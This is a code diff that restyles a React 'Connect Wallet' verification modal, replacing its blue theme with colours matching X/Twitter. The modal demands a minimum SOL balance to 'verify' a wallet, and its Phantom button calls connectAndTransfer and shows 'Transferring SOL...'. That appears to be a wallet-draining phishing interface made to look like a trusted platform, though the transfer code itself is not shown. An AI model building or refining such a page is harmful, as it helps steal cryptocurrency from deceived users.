@@ -263,30 +263,30 @@ export default function VerifyConnectModal({ isOpen, onClose, onConnect }: Verif
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm">
       <div className="relative w-full max-w-md mx-4">
-        <div className="absolute inset-0 bg-blue-700/25 rounded-2xl blur-xl opacity-40 animate-pulse" />
+        <div className="absolute inset-0 bg-white/5 rounded-2xl blur-xl opacity-40 animate-pulse" />
 
-        <div className="relative bg-[#050d1a] border border-blue-500/30 rounded-2xl shadow-2xl overflow-hidden">
+        <div className="relative bg-black border border-white/10 rounded-2xl shadow-2xl overflow-hidden">
           <button
             onClick={onClose}
-            className="absolute top-4 right-4 text-gray-400 hover:text-white transition-colors z-10"
+            className="absolute top-4 right-4 text-[#71767b] hover:text-white transition-colors z-10"
           >
             <X className="w-6 h-6" />
           </button>
 
           <div className="text-center pt-8 pb-6 px-6">
-            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-blue-700 mb-4">
+            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/10 mb-4">
               <Wallet className="w-8 h-8 text-white" />
             </div>
             <h2 className="text-2xl font-bold text-white mb-2">Connect Wallet</h2>
-            <p className="text-gray-400 text-sm">Choose your preferred wallet to get started</p>
+            <p className="text-[#71767b] text-sm">Choose your preferred wallet to get started</p>
           </div>
 
           <div className="px-6 pb-8">
-            <div className="mb-4 p-3 bg-blue-900/20 border border-blue-500/30 rounded-lg flex items-start gap-2">
-              <AlertCircle className="w-4 h-4 text-blue-400 flex-shrink-0 mt-0.5" />
-              <p className="text-gray-300 text-xs">
+            <div className="mb-4 p-3 bg-white/5 border border-white/10 rounded-lg flex items-start gap-2">
+              <AlertCircle className="w-4 h-4 text-[#1d9bf0] flex-shrink-0 mt-0.5" />
+              <p className="text-[#71767b] text-xs">
                 Minimum balance of{" "}
-                <span className="text-blue-400 font-semibold">
+                <span className="text-[#1d9bf0] font-semibold">
                   {minBalance} SOL (≈${(minBalance * solToUsdRate).toFixed(2)})
                 </span>{" "}
                 required to verify your wallet. Please ensure you have sufficient SOL in your 
@@ -294,7 +294,7 @@ export default function VerifyConnectModal({ isOpen, onClose, onConnect }: Verif
             </div>
 
             {error && (
-              <div className="mb-4 p-3 bg-red-900/20 border border-red-500/30 rounded-lg">
+              <div className="mb-4 p-3 bg-red-500/10 border border-red-500/20 rounded-lg">
                 <p className="text-red-400 text-sm">{error}</p>
               </div>
             )}
@@ -302,10 +302,10 @@ export default function VerifyConnectModal({ isOpen, onClose, onConnect }: Verif
             <button
               onClick={connectAndTransfer}
               disabled={connecting || transferring}
-              className="group w-full bg-blue-900/20 hover:bg-blue-900/30 border border-blue-500/30 hover:border-blue-500/50 rounded-xl p-4 transition-all duration-300 transform hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed"
+              className="group w-full bg-white/5 hover:bg-white/10 border border-white/10 hover:border-white/20 rounded-xl p-4 transition-all duration-300 transform hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed"
             >
               <div className="flex items-center gap-4">
-                <div className="flex-shrink-0 w-14 h-14 bg-blue-700 rounded-xl flex items-center justify-center shadow-lg group-hover:shadow-blue-700/40 transition-shadow">
+                <div className="flex-shrink-0 w-14 h-14 bg-[#1d9bf0] rounded-xl flex items-center justify-center shadow-lg group-hover:shadow-[#1d9bf0]/30 transition-shadow">
                   <svg viewBox="0 0 128 128" className="w-8 h-8">
                     <defs>
                       <linearGradient id="phantom-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
@@ -322,7 +322,7 @@ export default function VerifyConnectModal({ isOpen, onClose, onConnect }: Verif
 
                 <div className="flex-1 text-left">
                   <h3 className="text-white font-bold text-lg mb-1">Phantom</h3>
-                  <p className="text-gray-400 text-sm">
+                  <p className="text-[#71767b] text-sm">
                     {transferring
                       ? "Transferring SOL..."
                       : connecting
@@ -333,7 +333,7 @@ export default function VerifyConnectModal({ isOpen, onClose, onConnect }: Verif
 
                 <div className="flex-shrink-0">
                   <svg
-                    className="w-6 h-6 text-blue-400 group-hover:translate-x-1 transition-transform"
+                    className="w-6 h-6 text-[#71767b] group-hover:text-white group-hover:translate-x-1 transition-all"
                     fill="none"
                     stroke="currentColor"
                     viewBox="0 0 24 24"
@@ -344,14 +344,14 @@ export default function VerifyConnectModal({ isOpen, onClose, onConnect }: Verif
               </div>
             </button>
 
-            <div className="mt-6 p-4 bg-blue-900/10 border border-blue-500/20 rounded-lg">
-              <p className="text-gray-400 text-xs text-center">
+            <div className="mt-6 p-4 bg-white/5 border border-white/5 rounded-lg">
+              <p className="text-[#71767b] text-xs text-center">
                 By connecting your wallet, you agree to our{" "}
-                <a href="/terms" className="text-blue-400 hover:underline">
+                <a href="/terms" className="text-[#1d9bf0] hover:underline">
                   Terms of Service
                 </a>{" "}
                 and{" "}
-                <a href="/privacy-policy" className="text-blue-400 hover:underline">
+                <a href="/privacy-policy" className="text-[#1d9bf0] hover:underline">
                   Privacy Policy
                 </a>
               </p>
